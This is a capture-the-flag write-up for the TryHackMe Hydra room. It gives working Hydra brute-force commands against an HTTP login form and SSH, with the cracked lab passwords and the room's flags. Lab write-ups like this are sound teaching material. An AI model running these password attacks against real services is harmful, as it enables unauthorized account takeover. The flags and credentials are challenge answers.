# Hydra Challenge Writeup (TryHackMe)
#pentest/tryhackme

The first thing we need to do is connect to the TryHackMe VPN. Here's how:

1. Sign in to your TryHackMe account and go to the 'Access' page.
2. Download your VPN configuration file.
3. Install a VPN client like OpenVPN.
4. Import the configuration file into the VPN client.
5. Connect to the VPN using the imported configuration.

Once connected, you can start accessing the TryHackMe labs and exercises.

# Nmap Scan
Next, we'll perform an Nmap scan by typing the following command in the shell:

```shell
$ sudo nmap -sV -O <IP>
```

The scan results show that port 80 (HTTP) and port 22 (SSH) are open.
When we enter the IP address in our browser, it redirects us to http://<IP>/login

# Finding the Web Password

For this, we are using brute force.

I preferred to use Hydra, but you can also do it with other brute force tools (Burp Suite, etc.). Here's the Hydra command I used:
```shell
$ hydra -l molly -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
```
The -l parameter in Hydra specifies the username or the path to a file containing a list of usernames for brute force attacks. 
The -P parameter specifies the password or the path to a file containing a list of passwords. 
After that, you need to specify the IP address. To determine whether the request is GET or POST, you can inspect the page using the browser's developer tools (Inspect Element) or learn this by using Burp Suite.

Below is the result of the scan:
```shell
[DATA] attacking http-post-form://10.10.125.70:80/login:username=^USER^&password=^PASS^:incorrect
[80][http-post-form] host: 10.10.125.70   login: molly   password: sunshine
[STATUS] attack finished for 10.10.125.70 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

The password was found to be 'sunshine' and the web login page is being accessed.
The web login page was accessed, and the following code was found: THM{2673a7dd116de68e85c48ec0b1f2612e}

# Finding the SSH password

```shell
$ hydra -l molly -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<IP>
```
Below is the result of the scan: 
```shell
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.125.70:22/
[22][ssh] host: 10.10.125.70   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
```

Afterwards, we need to log in via SSH using the command below:
```shell    
$ ssh molly@10.10.125.70
```

The login is successful. Now, we need to find the location of flag2.txt and read it using the cat command.

```shell
molly@ip-10-10-125-70:~$ ls
flag2.txt

molly@ip-10-10-125-70:~$ cat flag2.txt
THM{c8eeb0468febbadea859baeb33b2541b}
```

You can find the room here: https://tryhackme.com/r/room/hydra

I appreciate you taking the time to read my writeup!!